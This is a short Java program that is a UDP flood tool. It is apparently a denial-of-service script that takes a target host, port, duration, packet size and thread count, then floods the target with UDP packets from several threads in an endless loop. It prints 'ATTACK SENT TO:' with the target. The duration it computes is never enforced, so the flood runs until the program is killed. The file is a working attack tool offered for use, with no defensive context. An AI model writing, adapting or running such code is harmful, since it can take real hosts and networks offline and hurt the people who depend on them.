import java.io.*;
import java.net.*;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetSocketAddress;
public class Main {
    private static Runnable attack(String host, int port, long endTime, long bytes){
        System.out.flush();
        return new Runnable() {
            @Override
            public void run() {
                try {
                    final byte[] buffer = new byte[(int) bytes];
                    final DatagramSocket socket = new DatagramSocket();
                    final DatagramPacket packet = new DatagramPacket(buffer, buffer.length, new InetSocketAddress(host, port));
                    socket.send(packet);
                    socket.send(packet);
                    while(true){
                        socket.send(packet);
                        socket.send(packet);
                        socket.send(packet);
                    }
                }catch (Exception e){
                    System.out.println("SEGMEGATION FAULT.");
                }
            }
        };
    }
    public static void main(String[] args) {
        System.out.println("ATTACK SENT TO:"+args[0]+":ON PORT:"+args[1]+":FOR:"+args[2]+":SECONDS.");
        final int threads = Integer.parseInt(args[4]);
        for (int x = 1; x < threads; x++){
            final long endTime = System.currentTimeMillis() + (Integer.parseInt(args[2]) * 1000);
            new Thread(attack(args[0], Integer.parseInt(args[1]), endTime, Long.parseLong(args[3]))).start();
        }
    }
}
